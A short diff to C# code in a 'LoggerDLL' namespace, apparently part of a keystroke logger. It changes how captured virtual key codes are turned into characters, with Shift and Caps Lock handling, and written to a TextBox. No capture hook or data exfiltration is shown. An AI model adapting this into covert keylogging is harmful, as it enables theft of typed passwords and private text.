@@ -30,7 +30,7 @@ namespace LoggerDLL
         public void WriteToLog(int vkCode, string path, TextBox form)
         {
             Console.WriteLine(vkCode);
-            form.AppendText("0x"+vkCode.ToString("X"));
+            form.AppendText("0x"+vkCode.ToString("X")+" ");
             
 
         }
@@ -56,8 +56,6 @@ namespace LoggerDLL
 
     public class SmartStrategy : ILoggerWriter
     {
-
-        bool shift = false;
         public void WriteToLog(int vkCode, string path, TextBox text)
         {
             bool isCapital = Control.IsKeyLocked(Keys.CapsLock);
@@ -254,9 +252,15 @@ namespace LoggerDLL
                         break;
                     }
                 default:
-                    {
-                        if (!isCapital && vkCode >= VK_A && vkCode <= VK_Z)
+                    {                         
+                        if ((Control.ModifierKeys & Keys.Shift) != 0 && vkCode >= VK_A && vkCode <= VK_Z)
+                        {
+                            text.AppendText((char)(vkCode) + "");
+                        }
+                        else if (!isCapital && vkCode >= VK_A && vkCode <= VK_Z)
+                        {
                             text.AppendText((char)(vkCode + 32) + "");
+                        }
                         else
                             text.AppendText((char)vkCode + "");
                         Console.WriteLine((Keys)vkCode);
